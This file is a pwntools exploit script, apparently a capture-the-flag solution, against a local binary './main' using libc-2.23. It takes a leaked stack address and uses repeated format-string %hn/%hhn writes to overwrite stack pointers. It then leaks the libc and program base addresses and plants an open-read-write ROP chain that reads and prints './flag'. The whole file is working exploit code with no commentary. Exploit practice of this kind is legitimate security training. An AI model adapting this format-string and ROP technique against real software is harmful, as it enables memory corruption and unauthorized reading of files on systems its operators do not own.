from pwn import*
#############
libc =ELF('./libc-2.23.so')
while True:
	p = process('./main')
	try:
		p.recvuntil('Gift: ')
		stack = int(p.recv(14),16)
		log.info('Stack:\t' + hex(stack))
		offset = 9
		retval = stack&0xFFFF
		if retval > 0x2000:
			p.close()
			continue
		p.sendline('%' + str((stack&0xFF - 0x10)) + 'c%6$hhn')
		p.sendline('%61c%10$hhn')

		p.sendline('%' + str((stack - 0x10 - 0x10 + 1)&0xFFFF) + 'c%6$hn')
		p.sendline('%74c%10$hhn')

		p.sendline('%' + str((stack - 0x10 - 0x10 + 0)&0xFFFF) + 'c%6$hn')
		p.sendline('%144c%10$hhn')

		p.sendline('%' + str((stack - 0x10 - 0x18)&0xFFFF) + 'c%6$hn')
		p.sendline('%183c%10$hhn')

		p.sendline('%' + str((stack - 0x70)&0xFFFF) + 'c%6$hn') #*
		p.sendline('%144c%10$hhn')

		p.sendline('%2c%29$nFMYY')
		p.recvuntil('FMYY',timeout=0.5)
		p.sendline('LIBC:%13$pProc:%9$p')
		p.recvuntil('LIBC:')
		libc_base = int(p.recv(14),16) - 240 - libc.sym['__libc_start_main']
		log.info('LIBC:\t' + hex(libc_base))
		p.recvuntil('Proc:')
		proc_base = int(p.recv(14),16) - 0x202040
		log.info('Proc:\t' + hex(proc_base))
		log.info('PID:\t' + hex(p.pid))
		pop_rsi_ret = libc_base + 0x000000000006E7F3
		pop_rdi_ret = libc_base + 0x0000000000140613
		pop_rdx_ret = libc_base + 0x0000000000001B9A
		pop_rdx_rsi = libc_base + 0x0000000000115189
		Open = libc_base + libc.sym['open']
		Read = libc_base + libc.sym['read']
		Puts = libc_base + libc.sym['puts']
		orw  = './flag\x00\x00' + p64(pop_rdi_ret) + p64(proc_base + 0x202058) + p64(pop_rsi_ret) + p64(0) + p64(Open)
		orw += p64(pop_rdi_ret) + p64(1) + p64(pop_rdx_rsi) + p64(0x30) + p64(proc_base + 0x2020F0) + p64(Read)
		orw += p64(pop_rdi_ret) + p64(proc_base + 0x2020F0) + p64(Puts)
		pause()
		p.sendline('%' + str((stack - 0x128)&0xFFFF) + 'c%15$hn')
		p.sendline('%88c%41$hhn')
		for i in range(1,6):
			p.sendline('%' + str((stack - 0x128 + i)&0xFF) + 'c%15$hhn')
			p.sendline('%' + str(((proc_base + 0x202040)>>(i*8))&0xFF) + 'c%41$hhn')
		p.sendline('%' + str((stack - 0x120)&0xFF) + 'c%15$hhn')
		p.sendline('%182c%41$hhn'.ljust(0x18,'\x00') + orw)
		pause()
		break
	except:
		p.close()
		continue
p.interactive()
